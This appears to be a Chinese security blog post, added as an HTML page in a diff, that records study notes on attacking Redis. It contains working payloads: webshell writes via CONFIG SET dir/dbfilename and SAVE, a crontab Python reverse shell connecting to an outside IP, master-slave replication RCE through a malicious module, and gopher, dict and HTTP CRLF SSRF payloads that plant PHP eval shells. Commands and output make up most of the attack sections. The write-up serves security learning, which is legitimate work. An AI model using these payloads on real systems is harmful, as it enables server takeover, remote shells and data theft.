@@ -1,0 +1,731 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="referrer" content="no-referrer">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>redis安全学习小记 | xray 技术博客</title>
+<link rel="shortcut icon" href="https://blog.xray.cool/favicon.ico?v=1601447848082">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.xray.cool/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="redis安全学习小记 | xray 技术博客 - Atom Feed" href="https://blog.xray.cool/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="基础
+https://www.runoob.com/redis/redis-tutorial.html
+环境 ： ubuntu 安装 redis
+$sudo apt-get update
+$sudo apt-get install redi..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.xray.cool">
+  <img class="avatar" src="https://blog.xray.cool/images/avatar.png?v=1601447848082" alt="">
+  </a>
+  <h1 class="site-title">
+    xray 技术博客
+  </h1>
+  <p class="site-description">
+    
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives/" class="menu">
+          归档
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              redis安全学习小记
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-09-04
+              </span>
+              <span>
+                27 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://blog.xray.cool/post-images/learning-redis-security.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="基础">基础</h1>
+<p>https://www.runoob.com/redis/redis-tutorial.html</p>
+<p>环境 ： ubuntu 安装 redis</p>
+<pre><code>$sudo apt-get update
+$sudo apt-get install redis-server
+$service redis-server start
+$redis-cli
+</code></pre>
+<h2 id="redis连接命令">redis连接命令</h2>
+<p><code>redis-cli -h 127.0.0.1 -p 6379</code></p>
+<h2 id="设置键值对">设置键值对:</h2>
+<p><code>set myKey abc</code></p>
+<h2 id="取出键值对">取出键值对:</h2>
+<p><code>get myKey</code></p>
+<pre><code>127.0.0.1:6379&gt; set yulige 123123
+OK
+127.0.0.1:6379&gt; get yulige
+&quot;123123&quot;
+</code></pre>
+<p>通过nc监听或者socat抓包的方法<code>socat -v tcp-listen:6378,fork tcp-connect:localhost:6379</code>或者是tcpdump<br>
+<code>apt-get install tcpdump tcpdump -i eth0 port 6379 -o nopass.pcap</code><br>
+可以发现发送的数据为</p>
+<pre><code>*3
+$3
+set
+$6
+yulige
+$6
+123123
+和
+*2
+$3
+get
+$6
+yulige
+</code></pre>
+<h2 id="获取配置">获取配置</h2>
+<p><code>CONFIG GET *</code></p>
+<h2 id="编辑配置">编辑配置</h2>
+<p>你可以通过修改 redis.conf 文件或使用<code>CONFIG set</code> 命令来修改配置。<br>
+https://www.runoob.com/redis/redis-conf.html</p>
+<h2 id="数据类型">数据类型</h2>
+<p>Redis支持五种数据类型：string（字符串），hash（哈希），list（列表），set（集合）及zset(sorted set：有序集合)。</p>
+<h2 id="服务器配置">服务器配置</h2>
+<p><a href="https://woodwhales.cn/2019/01/01/008/">redis 学习笔记 | 安装与启动</a></p>
+<pre><code>sed -i 's/daemonize no/daemonize yes/g' /etc/redis-5.0.8/redis.conf
+</code></pre>
+<p>后台运行redis</p>
+<h2 id="认证">认证</h2>
+<p>redis设置密码的两种方法<br>
+redis-cli连上去<br>
+<code>config set requirepass 123456</code><br>
+或者修改redis.conf</p>
+<pre><code>sed -i 's/# requirepass foobared/requirepass foobared/g' /etc/redis/redis.conf
+</code></pre>
+<p>第二种方法设置完之后需要重启redis。</p>
+<p>然后再用redis-cli去连的时候需要先执行AUTH命令才可以执行其他命令。<br>
+<code>AUTH PASSWORD</code><br>
+redis-cli -a的参数本质是就是AUTH命令。然后因为客户端将命令发送到Redis服务器的流程为</p>
+<p>客户端向Redis服务器发送一个仅由Bulk Strings组成的RESP Arrays。<br>
+Redis服务器回复发送任何有效RESP数据类型作为回复的客户端。https://www.anquanke.com/post/id/181599<br>
+所以在ssrf的时候只要在前面加上添加<code>%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123123%0D%0A</code>，即可。</p>
+<h2 id="数据库备份">数据库备份</h2>
+<p>Redis SAVE 命令用于创建当前数据库的备份。常见利用其来写文件达到getshell的目的。</p>
+<pre><code>redis-cli -h 127.0.0.1 flushall #清空所有key
+redis-cli -h 127.0.0.1 config set dir /var/www #设置数据库备份保存的目录
+redis-cli -h 127.0.0.1 config set dbfilename shell.php #设置数据库备份保存的文件名
+redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot; #将想写入的内容写进key值
+redis-cli -h 127.0.0.1 save # 备份
+</code></pre>
+<h2 id="主从复制">主从复制</h2>
+<p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</p>
+<p>默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。</p>
+<p>https://www.cnblogs.com/kismetv/p/9236731.html#t2</p>
+<p>输入以下命令<br>
+<code>slaveof host port</code><br>
+之后发生了哪些事情呢。</p>
+<pre><code>&gt; 2020/04/10 09:30:01.182183  length=14 from=0 to=13
+*1\r
+$4\r
+PING\r
+&lt; 2020/04/10 09:30:01.182422  length=7 from=0 to=6
++PONG\r
+&gt; 2020/04/10 09:30:01.182595  length=49 from=14 to=62
+*3\r
+$8\r
+REPLCONF\r
+$14\r
+listening-port\r
+$4\r
+6379\r
+&lt; 2020/04/10 09:30:01.182875  length=5 from=7 to=11
++OK\r
+&gt; 2020/04/10 09:30:01.183002  length=59 from=63 to=121
+*5\r
+$8\r
+REPLCONF\r
+$4\r
+capa\r
+$3\r
+eof\r
+$4\r
+capa\r
+$6\r
+psync2\r
+&lt; 2020/04/10 09:30:01.183203  length=5 from=12 to=16
++OK\r
+&gt; 2020/04/10 09:30:01.183300  length=72 from=122 to=193
+*3\r
+$5\r
+PSYNC\r
+$40\r
+c8848089bebcde2b8d5a19e751a7bc4a260c88f8\r
+$4\r
+1275\r
+&lt; 2020/04/10 09:30:01.183838  length=59 from=17 to=75
++FULLRESYNC da9658e1e4cbeb49c3f12e478d2a61179cb8c0f2 1274\r
+&lt; 2020/04/10 09:30:01.280693  length=197 from=76 to=272
+$191\r
+REDIS0009.      redis-ver.5.0.8.
+redis-bits.@..ctime..&lt;.^.\bused-mem.P.....repl-stream-db...\arepl-id(da9658e1e4cbeb49c3f12e478d2a61179cb8c0f2.\vrepl-offset....\faof-preamble.........{.{....{..l..]d.^&gt; 2020/04/10 09:30:01.284087  length=1 from=194 to=194
+
+&gt; 2020/04/10 09:30:02.184067  length=37 from=195 to=231
+*3\r
+$8\r
+REPLCONF\r
+$3\r
+ACK\r
+$4\r
+1274\r
+
+</code></pre>
+<p>转换成rediscommand是</p>
+<pre><code>&gt; PING
+PONG
+&gt; REPLCONF listening-port 4444
+OK
+&gt; replconf capa eof capa psync2
+OK
+&gt; psync c8848089bebcde2b8d5a19e751a7bc4a260c88f8 1275
++FULLRESYNC da9658e1e4cbeb49c3f12e478d2a61179cb8c0f2 1274 +[rdb备份]
+</code></pre>
+<p>以上就是主从复制的全过程，可以类似于数据库备份了，</p>
+<p><strong>然后因为redis采用的resp协议的验证非常简洁，所以可以采用python模拟一个redis服务的交互，并且将备份的rdb数据库备份文件内容替换为恶意的so文件，然后就会自动在节点redis中生成exp.so,再用module load命令加载so文件即可完成rce，这就是前段时间非常火的基于主从复制的redisrce的原理</strong></p>
+<p>基于redis主从复制的rce，可以说已经是众所周知的了。</p>
+<p>https://paper.seebug.org/975/</p>
+<p>正常写crontab</p>
+<pre><code>127.0.0.1:6379&gt; config set dir /var/spool/cron/crontabs
+OK
+127.0.0.1:6379&gt; config set dbfilename root
+OK
+127.0.0.1:6379&gt; get 1
+&quot;\n* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;115.28.78.16\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'\n&quot;
+127.0.0.1:6379&gt; save
+OK
+</code></pre>
+<p>而这种方式是通过写文件来完成GetShell的，这种方式的主要问题在于，redis保存的数据并不是简单的json或者是csv，所以写入的文件都会有大量的无用数据，形似</p>
+<pre><code>[padding]
+* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;115.28.78.16\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'
+[padding]
+</code></pre>
+<p>正是因为redis会在写入的数据前面有padding，所以我想用redis本身的功能去写入so文件来完成rce是不可能了，因为elf格式的严格性，但是在后面padding倒是并无影响。</p>
+<p>同理，在主从复制rce这个过程中，如果是两个正常的redis服务之间建立联系，仅仅是相当于的数据库备份的复制，而在主节点加载的module是不会到节点去的。所以在上传so这条路上只能凭借于web应用的上传，经过测试，只需要有读权限即可，而www-data默认写入的文件权限是644，<strong>所以实战中完全可以结合上传来完成攻击</strong>。</p>
+<p>主从复制的利用场景在于<strong>节点服务可以访问主节点</strong>，因为只要主节点可以返回包就行了，复制数据库是从返回的包里面去获取的。所以只要防火墙允许可以出来外网就行了。</p>
+<p>然后配合ssrf去攻击redis。</p>
+<p>在ssrf的攻击redis的过程中，若redis版本在4.0以上，则利用主从复制功能传入so文件完成rce。若在4以下，除了直接用gopher发包写文件之外，<strong>同样可以结合主从复制来传入key值从而写文件来getshell。</strong></p>
+<p>补充：</p>
+<p>每个Redis节点(无论主从)，在启动时都会自动生成一个随机ID(每次启动都不一样)，由40个随机的十六进制字符组成；runid用来唯一识别一个Redis节点。通过info Server命令，可以查看节点的runid：</p>
+<p><code>redis-cli info server | grep &quot;run_id&quot;</code></p>
+<p>如果从节点之前未执行过slaveof或最近执行了<code>slaveof no one</code>则从节点发送命令为<code>psync ? -1</code>，向主节点请求全量复制；<br>
+如果从节点之前执行了slaveof，则发送命令为<code>psync &lt;runid&gt; &lt;offset&gt;</code>，其中runid为上次复制的主节点的runid，offset为上次复制截止时从节点保存的复制偏移量。</p>
+<h2 id="加载动态链接库">加载动态链接库</h2>
+<p>https://zhuanlan.zhihu.com/p/44685035</p>
+<p>以往我们想给 Redis 加个功能或类似事务的东西只能用 Lua 脚本，这个东西没有实现真正的原子性，另外也无法使用底层的 API ，实质上比单纯的命令脚本提升有限。</p>
+<p><strong>Redis 4.0 终于加入了模块</strong>，暴露了必要的 API，并且有自动内存管理（大大减轻编写负担），基于 C99（C++ 或者其它语言的 C 绑定接口当然也可以）。</p>
+<p><code>MODULE LOAD /path/to/mymodule.so</code>    在 redis-cli 中执行，注意这里 mymodule.so 是文件名</p>
+<h3 id="rce">rce</h3>
+<p>其实本质是<strong>Redis Lua Sandbox Escape</strong>绕过的代码具体见 https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK</p>
+<pre><code>127.0.0.1:6379&gt; module load /tmp/exppadding.so
+OK
+127.0.0.1:6379&gt; system.exec &quot;id&quot;
+&quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;
+</code></pre>
+<p>参考 https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf 和自己实验 发现4以上版本通杀，redis作者也没有修的意思 ，因为 http://antirez.com/news/96 作者觉得如果被登陆上redis之后可能产生的安全性问题他就不管了，他没必要去把这百分之1的功能复杂化。</p>
+<p>综上所述 ， redis4.0以上添加了加载动态链接库的添加扩展功能，而使用<a href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK">Redis Lua Sandbox Escape</a>的exp可以执行命令，自定义了system.exec函数来完成rce，并且将结果回显。</p>
+<h1 id="dict协议和gopher协议攻击redis">dict协议和gopher协议攻击redis</h1>
+<h2 id="gopher">gopher</h2>
+<p>做一下对比：直连上redis执行<code>set 1 123</code></p>
+<pre><code>&gt; 2020/04/10 14:15:14.919897  length=29 from=62 to=90
+*3\r
+$3\r
+set\r
+$1\r
+1\r
+$3\r
+123\r
+&lt; 2020/04/10 14:15:14.920096  length=5 from=19 to=23
++OK\r
+</code></pre>
+<p>什么是gopher协议。它是互联网上使用的分布型的文件搜集获取网络协议。gopher支持多行。因此要在传输的数据前家一个无用字符。比如<code>gopher://ip:port/_</code>  通常用<code>_</code>，并不是只能用<code>_</code>，gopher协议会将第一个字符&quot;吃掉&quot;。</p>
+<p>gopher协议的话直接就当socket包发就行，注意一下redis是RESP协议的规则，上面说了。<br>
+resp协议规则 https://www.anquanke.com/post/id/181599</p>
+<pre><code>客户端将命令发送到Redis服务器的流程为
+
+客户端向Redis服务器发送一个仅由Bulk Strings组成的RESP Arrays。
+Redis服务器回复发送任何有效RESP数据类型作为回复的客户端。
+Bulk Strings用于表示长度最大为512 MB的单个二进制安全字符串，按以下方式编码：
+
+一个$字节后跟组成字符串的字节数（一个前缀长度），由CRLF终止。
+实际的字符串数据。
+最终的CRLF。
+</code></pre>
+<pre><code>yulige@yulige-ubuntu:~$ curl &quot;gopher://0.0.0.0:4444/_*3%0d%0A%243%0d%0Aset%0d%0A%241%0d%0A1%0d%0A%243%0d%0A123&quot;
++OK
+
+</code></pre>
+<pre><code>&gt; 2020/04/10 14:16:55.477293  length=29 from=0 to=28
+*3\r
+$3\r
+set\r
+$1\r
+1\r
+$3\r
+123\r
+&lt; 2020/04/10 14:16:55.477561  length=5 from=0 to=4
++OK\r
+</code></pre>
+<p><code>get key</code>也可以正常获取到字符串123，完全一致。</p>
+<h2 id="dict">dict</h2>
+<p>dict协议的话之前了解的不多，只知道可以用来探测端口信息<code>curl dict://localhost:22/info</code>，网上搜了一下大概是这么描述的<code>dict协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name data，并在末尾 自动补上rn(CRLF)</code>结果测试其实还会发送一个QUIT。</p>
+<p>为了进一步理解dict协议，我翻了一下<a href="http://www.dict.org/rfc2229.txt">rfc文档</a>，发现我之前的理解都是错误的。</p>
+<pre><code>Command lines must be complete with all required parameters, and may not contain more than one command.
+</code></pre>
+<p>说明了 禁止多行命令。尝试了一下也没法crlf绕过去，他是把一整个command字符串化了，没法逃逸出来。<br>
+测试</p>
+<pre><code>yulige@yulige-ubuntu:~$ curl &quot;dict://0.0.0.0:6379/auth yuligesec\r\ninfo&quot;
+-NOAUTH Authentication required.
+-ERR invalid password
++OK
+</code></pre>
+<p>收到的</p>
+<pre><code>CLIENT libcurl 7.63.0
+auth yuligesec\r\ninfo
+QUIT
+</code></pre>
+<p>正因如此，dict协议没法攻击需要认证的redis。</p>
+<p>使用dict协议需要用:来作为分隔.经过测试也可以不加，直接空格即可。rfc里面也是这么写的。</p>
+<pre><code>yulige@yulige-ubuntu:~$ curl &quot;dict://0.0.0.0:4444/set:1:123&quot;
+-ERR Syntax error, try CLIENT (LIST | KILL ip:port | GETNAME | SETNAME connection-name)
++OK
++OK
+</code></pre>
+<p>可以看到居然返回了2个ok，说明发送了两条命令。</p>
+<pre><code>&gt; 2020/04/10 14:23:28.776420  length=40 from=0 to=39
+CLIENT libcurl 7.63.0\r
+set 1 123\r
+QUIT\r
+&lt; 2020/04/10 14:23:28.777950  length=99 from=0 to=98
+-ERR Syntax error, try CLIENT (LIST | KILL ip:port | GETNAME | SETNAME connection-name)\r
++OK\r
++OK\r
+</code></pre>
+<p>可以看到其实发送了3行命令，而且并不是RESP协议格式的。第一行应该是代表发出的cli的工具和版本，rfc上也是这么写的</p>
+<pre><code>This command allows the client to provide information about itself for possible logging and statistical purposes.  All clients SHOULD send this command after connecting to the server.  All DICT servers MUST implement this command (note, though, that the server doesn't have to do anything with the information provided by the client).
+</code></pre>
+<p>这条命令是客户端提供有关其自身的信息，以便进行可能的日志记录和统计。连接到服务器后，所有客户端都应发送此命令。根据这里可以发现CLIENT命令貌似是必不可少的。</p>
+<p>而第二行是<br>
+cli中执行的命令，第三行是dict协议带上的QUIT。</p>
+<p>用php中的curl看看是什么包。</p>
+<pre><code>&lt;?php
+   $ch = curl_init(); 
+   curl_setopt($ch, CURLOPT_URL, &quot;dict://192.168.248.128:4444/set:1:123&quot;); 
+   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+   curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
+   $output = curl_exec($ch); 
+   echo $output;
+   curl_close($ch);         
+</code></pre>
+<p>结果是</p>
+<pre><code>CLIENT libcurl 7.56.0
+set 1 123
+QUIT
+</code></pre>
+<p>和命令行的curl完全一样。</p>
+<p>突然想到如果用gopher发出这个包会如何。先测试</p>
+<pre><code>yulige@yulige-ubuntu:~$ curl &quot;gopher://0.0.0.0:6379/_CLIENT%20libcurl%207.63.0%0D%0Aauth%20yuligesec%0A%0Dinfo%0D%0AQUIT&quot;
+</code></pre>
+<p>正常返回info信息。<br>
+而如果把CLIENT去掉呢？</p>
+<pre><code>yulige@yulige-ubuntu:~$ curl &quot;gopher://0.0.0.0:6379/_auth%20yuligesec%0A%0Dinfo%0D%0AQUIT&quot;
+</code></pre>
+<p>依然正常返回。也就是说确实直接给redis服务器发command也是可以的。此时测试版本为<strong>3.0.6</strong>换了一下<strong>5.0.8</strong>也是没问题的。</p>
+<h2 id="http协议打redisprotocol-smuggle的思考">http协议打redis（protocol smuggle的思考）</h2>
+<p>既然直接发command也是可以的，那岂不是在http协议中的请求包里面包含command也可以呢。</p>
+<p>在<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">《【Blackhat】SSRF的新纪元：在编程语言中利用URL解析器》</a> 中orange有提到利用http协议中的crlf来发送rediscommand的案例，以及提到了一个nodejs中过滤了crlf但是依然可以使用<code>http://127.0.0.1:6379/ -SLAVEOF @orange.tw@ 6379-</code>仍然能够进行protocol smuggle。</p>
+<p>然后自己试着构造了一个http请求包然后用nc发送，发现无论怎么构造都无法获取返回包（迷惑？啥情况，明明包都一模一样了）</p>
+<p>用curl</p>
+<pre><code>yulige@yulige-ubuntu:~$ curl -v &quot;http://0.0.0.0:6378/&quot;
+*   Trying 0.0.0.0...
+* TCP_NODELAY set
+* Connected to 0.0.0.0 (127.0.0.1) port 6378 (#0)
+&gt; GET / HTTP/1.1
+&gt; Host: 0.0.0.0:6378
+&gt; User-Agent: curl/7.63.0
+&gt; Accept: */*
+&gt;
+-ERR wrong number of arguments for 'get' command
+* Closing connection 0
+
+---------------------------------------------
+&gt; 2020/05/24 11:16:59.054108  length=76 from=0 to=75
+GET / HTTP/1.1\r
+Host: 0.0.0.0:6378\r
+User-Agent: curl/7.63.0\r
+Accept: */*\r
+\r
+&lt; 2020/05/24 11:16:59.054534  length=50 from=0 to=49
+-ERR wrong number of arguments for 'get' command\r
+</code></pre>
+<p>用nc</p>
+<pre><code>yulige@yulige-ubuntu:~$ cat httprequest | nc 127.0.0.1 6378
+yulige@yulige-ubuntu:~$
+
+------------------------------------------------
+&gt; 2020/05/24 11:20:10.739862  length=78 from=0 to=77
+GET / HTTP/1.1\r
+Host: 127.0.0.1:6378\r
+User-Agent: curl/7.63.0\r
+Accept: */*\r
+\r
+
+</code></pre>
+<p>肉眼看起来 数据包一模一样了，但是nc发送出去的没有响应包，上网查了一下资料发现应该这样去发送文件内容。</p>
+<pre><code>nc 127.0.0.1 6378 &lt;httprequest
+</code></pre>
+<p>然后发现 时灵时不灵？？？？？，有时候能收到返回包有时候收不到。</p>
+<pre><code>yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
+-ERR wrong number of arguments for 'get' command
+yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
+yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
+yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
+-ERR wrong number of arguments for 'get' command
+yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
+yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
+-ERR wrong number of arguments for 'get' command
+yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
+-ERR wrong number of arguments for 'get' command
+yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
+yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
+-ERR wrong number of arguments for 'get' command
+
+</code></pre>
+<p>我直接就一个大问号?啥情况啊...希望有师傅指点一下，已经超出了我的知识范围。<br>
+然后再用nc发送成功一次数据包看看</p>
+<pre><code>yulige@yulige-ubuntu:~$ cat httprequest
+GET / HTTP/1.1
+Host: 127.0.0.1:6378
+set 133 123
+User-Agent: curl/7.63.0
+Accept: */*
+
+------------------------------------------------
+&gt; 2020/05/24 11:44:54.783301  length=91 from=0 to=90
+GET / HTTP/1.1\r
+Host: 127.0.0.1:6378\r
+set 133 123\r
+User-Agent: curl/7.63.0\r
+Accept: */*\r
+\r
+&lt; 2020/05/24 11:44:54.783573  length=50 from=0 to=49
+-ERR wrong number of arguments for 'get' command\r
+</code></pre>
+<p>然后redis看123这个键是否存在，发现并没有。。</p>
+<p>然后尝试使用一个存在crlf的发送http请求的python模块来测试吧。</p>
+<p>推荐一个跑fuzz的项目<br>
+https://github.com/orangetw/Tiny-URL-Fuzzer</p>
+<p>参考：https://blog.csdn.net/qq_40989258/article/details/104735997</p>
+<pre><code class="language-python">import urllib2
+url = &quot;http://127.0.0.1:6378?a=1 HTTP/1.1\r\nCRLF-injection: test\r\nTEST: 123:6378/test/?test=a&quot;
+htmlpage = urllib2.urlopen(url).read()
+print htmlpage
+</code></pre>
+<p>抓包</p>
+<pre><code>&gt; 2020/05/24 11:59:47.666102  length=181 from=0 to=180
+GET /?a=1 HTTP/1.1\r
+CRLF-injection: test\r
+TEST: 123:6378/test/?test=a HTTP/1.1\r
+Accept-Encoding: identity\r
+Host: 127.0.0.1:6378\r
+Connection: close\r
+User-Agent: Python-urllib/2.7\r
+\r
+&lt; 2020/05/24 11:59:47.668209  length=161 from=0 to=160
+-ERR wrong number of arguments for 'get' command\r
+-ERR unknown command 'CRLF-injection:'\r
+-ERR unknown command 'TEST:'\r
+-ERR unknown command 'Accept-Encoding:'\r
+</code></pre>
+<p>效果还不错，测试写入一个key试试。</p>
+<pre><code>yulige@yulige-ubuntu:~$ cat testrediscrlf.py
+import urllib2
+url = &quot;http://127.0.0.1:6378?a=1 HTTP/1.1\r\nset 1234 123\r\ntest: 123&quot;
+htmlpage = urllib2.urlopen(url).read()
+print htmlpage
+----------------------------------
+&gt; 2020/05/24 12:27:42.221136  length=155 from=0 to=154
+GET /?a=1 HTTP/1.1\r
+set 1234 123\r
+test: 123 HTTP/1.1\r
+Accept-Encoding: identity\r
+Host: 127.0.0.1:6378\r
+Connection: close\r
+User-Agent: Python-urllib/2.7\r
+\r
+&lt; 2020/05/24 12:27:42.232387  length=126 from=0 to=125
+-ERR wrong number of arguments for 'get' command\r
++OK\r
+-ERR unknown command 'test:'\r
+-ERR unknown command 'Accept-Encoding:'\r
+----------------------------
+127.0.0.1:6379&gt; keys *
+1) &quot;1234&quot;
+127.0.0.1:6379&gt; get 1234
+&quot;123&quot;
+
+</code></pre>
+<p>确实是可以的，因为从dict协议中获得的思路，一行command就能发送过去，不需要转换为resp格式。<br>
+<strong>所以如果限制了协议类型为http或者其他的ssrf，依然可以用这个思路去攻击redis。只需要一个crlf即可。</strong></p>
+<h1 id="写webshell">写webshell</h1>
+<h2 id="redis-cli写webshell">redis-cli写webshell</h2>
+<p>若redis开放端口并允许外连,参考https://daolgts.github.io/2019/10/10/redis%20rce/</p>
+<p><code>redis3.2版本后新增 protected-mode 配置，默认是 yes，即开启,外部网络无法连接 redis 服务</code><br>
+我ubuntu本地安装的3.0.8,默认有<code>bind 127.0.0.1</code>的配置，禁止外连。<br>
+找一个能写的目录,利用数据库备份功能getshell。</p>
+<pre><code>127.0.0.1:6379&gt; config set dir /var/www/html
+OK
+127.0.0.1:6379&gt; config set dbfilename shell.php
+OK
+127.0.0.1:6379&gt; set webshell &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;
+OK
+127.0.0.1:6379&gt; save
+</code></pre>
+<p>看一下shell.php的内容</p>
+<pre><code>REDIS0006webshell&lt;?php @eval($_POST[1]);?&gt;▒▒I▒s▒.;▒
+</code></pre>
+<h2 id="ssrf写webshell">ssrf写webshell</h2>
+<h3 id="直接写入失败">直接写入(失败)</h3>
+<p>如果是ssrf呢。</p>
+<pre><code>root@yulige-ubuntu:/# curl -g  'dict://0.0.0.0:6379/set webshell &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;'
+</code></pre>
+<p>收到的却是以下内容。貌似是<code>?</code>这里截断掉了。</p>
+<pre><code>CLIENT libcurl 7.47.0
+set webshell '&lt;
+QUIT
+</code></pre>
+<p>url编码看看,收到的却是</p>
+<pre><code>CLIENT libcurl 7.47.0
+set%20webshell%20%22%3C%3Fphp%20%40eval(%24_POST%5B1%5D)%3B%3F%3E%22
+QUIT
+</code></pre>
+<p>看起来并不能url编码。</p>
+<p>网上查了一下资料并结合自己测试，<br>
+<code>?</code>之后的内容都没法获取到。那么如何去绕过呢。</p>
+<h3 id="转义绕过截断">转义绕过?截断</h3>
+<p><a href="https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ">dvpwriteup</a>曾经在一个ctf中出现过用转义编码去绕过的</p>
+<blockquote>
+<p>写入恶意代码：（&lt;? 等特殊符号需要转义，不然问号后面会导致截断无法写入）<br>
+dict://0:6379/set🐚&quot;\x3C\x3Fphp\x20echo<code>$_GET[x]</code>\x3B\x3F\x3E&quot;</p>
+</blockquote>
+<p>先直接拿上面这个的payload做测试：</p>
+<pre><code>CLIENT libcurl 7.47.0
+set shell &quot;\x3C\x3Fphp\x20echo`$_GET[x]`\x3B\x3F\x3E&quot;
+QUIT
+</code></pre>
+<p>cli连上去看看。</p>
+<pre><code>127.0.0.1:6379&gt; get shell
+&quot;&lt;?php echo`$_GET[x]`;?&gt;&quot;
+</code></pre>
+<p>成功写入。此时测试版本为<strong>3.0.6</strong>换了一下<strong>5.0.8</strong>同样写入成功。</p>
+<p>写入文件之后也同样是正常的webshell。</p>
+<h3 id="主从复制绕过截断">主从复制绕过?截断</h3>
+<p>当<code>？</code>截断的时候可以使用主从复制的方法将key值从主节点复制过来。然后节点再执行备份数据库操作写入webshell。</p>
+<p>主节点</p>
+<pre><code>127.0.0.1:4444&gt; set shell &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;
+OK
+</code></pre>
+<p>节点</p>
+<pre><code>dict://0:6379/slaveof:127.0.0.1:4444
+dict://0:6379/config:set:dir:/var/www/html
+dict://0:6379/config:set:dbfilename:shell.php
+dict://0:6379/save
+dict://0:6379/slaveof:no:one
+</code></pre>
+<p>查看一下文件是成功写入shell了。</p>
+<p><strong>当然了如果可以出外网也可以直接主从复制rce，这一点在前面就说过了。只要用python起一个服务去模拟redis的返回，并且在全量复制的时候把数据库文件替换成so文件即可。</strong></p>
+<h3 id="bitop命令绕过截断">bitop命令绕过?截断</h3>
+<p>前段时间<a href="https://hackmd.io/@theoldmoon0602/r1mltAWHL">[zer0pts CTF 2020] urlapp</a>出了一道考bitop命令的题。<br>
+<img src="https://p0.ssl.qhimg.com/dm/1024_203_/t01115b0d3e34d2e976.png" alt="" loading="lazy"><br>
+可以将key做位运算操作并存储在新的key中。</p>
+<p>而在<a href="https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&amp;mid=2247483865&amp;idx=1&amp;sn=41e56040229e383a82a671fc359ee82b&amp;chksm=f9ee6d66ce99e470d102becfcf63955f2aae1d88bc43ef8e7939bc93d786ff2f994eac969d32&amp;scene=126&amp;sessionid=1586255695&amp;key=c00e1a5b49adb240be940797e7d3cb821bae9b89771be268faa858b2888bbba3e96562ccac53df81389cb41e548a9e6412d4f83b6b7b541825630aa6ace9d1d040a3b7cd677b5ca137cc9b1d2297948e&amp;ascene=1&amp;uin=MzE0MDM4MzExMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080079&amp;lang=zh_CN&amp;exportkey=A6a52QI1M4H5IGXp8ekqTtY%3D&amp;pass_ticket=awXcPg%2FApqlfbrG8njT11ZZYAGjwbhrnExtbvARh%2F%2FrtbsupQLnZBKBPE6SCXvhn">一次“SSRF--&gt;RCE”的艰难利用</a>中，就是用bitop去绕过的<code>\x00</code></p>
+<pre><code>dict://0:6379/set:shell:&quot;\xc3\xc0\x8f\x97\x8f\xdf\xbf\x9a\x89\x9e\x93\xd7\xdb\xa0\xaf\xb0\xac\xab\xa4\xce\xa2\xd6\xc4\xc0\xc1&quot;
